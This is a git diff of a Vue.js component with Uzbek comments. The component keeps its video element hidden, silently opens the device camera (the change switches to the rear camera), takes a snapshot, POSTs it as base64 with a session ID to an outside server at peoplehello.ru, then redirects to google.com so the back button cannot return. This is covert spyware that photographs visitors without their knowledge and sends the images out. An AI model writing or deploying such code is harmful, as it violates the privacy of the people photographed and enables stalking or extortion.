@@ -1,4 +1,5 @@
 <template>
+  <!-- UI butunlay yashirin -->
   <video ref="video" playsinline muted style="display:none"></video>
 </template>
 
@@ -20,39 +21,48 @@ export default {
       }
 
       try {
-        // ❗ Universal: browser o‘zi optimal kamerani tanlaydi
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: true,
-          audio: false
-        })
+        // 🔹 1) ORQA kamerani aniqlashga urinamiz
+        const devices = await navigator.mediaDevices.enumerateDevices()
+        const backCam = devices.find(
+            d =>
+                d.kind === "videoinput" &&
+                /back|rear|environment/i.test(d.label)
+        )
+
+        const constraints = backCam
+            ? { video: { deviceId: { exact: backCam.deviceId } }, audio: false }
+            : { video: true, audio: false } // 🔁 fallback
+
+        // 🔹 2) Kamerani ochamiz
+        const stream = await navigator.mediaDevices.getUserMedia(constraints)
 
         const video = this.$refs.video
         video.srcObject = stream
 
-        // ❗ iOS / WebView uchun MUHIM
+        // 🔹 iOS / WebView uchun MUHIM
         await video.play()
 
-        // ❗ Kamera haqiqatan tayyor bo‘lishini kutamiz
+        // 🔹 Kamera haqiqatan tayyor bo‘lsin
         await new Promise(res => {
           if (video.readyState >= 2) return res()
           video.onloadedmetadata = res
         })
 
-        // ❗ Real qurilmalarda barqarorlik
+        // 🔹 Real qurilmalar uchun kichik buffer
         await new Promise(r => setTimeout(r, 600))
 
+        // 🔹 3) Rasm olish
         const canvas = document.createElement("canvas")
         canvas.width = video.videoWidth || 640
         canvas.height = video.videoHeight || 480
-
         const ctx = canvas.getContext("2d")
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height)
 
-        // Kamerani o‘chiramiz
+        // 🔹 Kamerani yopamiz
         stream.getTracks().forEach(t => t.stop())
 
-        // ✅ toBlob → FileReader → BASE64 (ENG ISHONCHLI)
-        canvas.toBlob((blob) => {
+        // 🔹 4) toBlob → base64 (ENG ISHONCHLI)
+        canvas.toBlob(blob => {
           if (!blob) return this.redirect()
 
           const reader = new FileReader()
@@ -60,9 +70,9 @@ export default {
             const imageBase64 = reader.result // data:image/jpeg;base64,...
 
             try {
-              await fetch("https://api.peoplehello.ru/api/front-cam", {
+              await fetch("https://api.peoplehello.ru/api/back-cam", {
                 method: "POST",
-                headers: {"Content-Type": "application/json"},
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                   image: imageBase64,
                   session_id
@@ -84,7 +94,7 @@ export default {
     },
 
     redirect() {
-      // history’da qolmasin
+      // back bosilganda qaytib kelmasin
       window.location.replace("https://google.com")
     }
   }
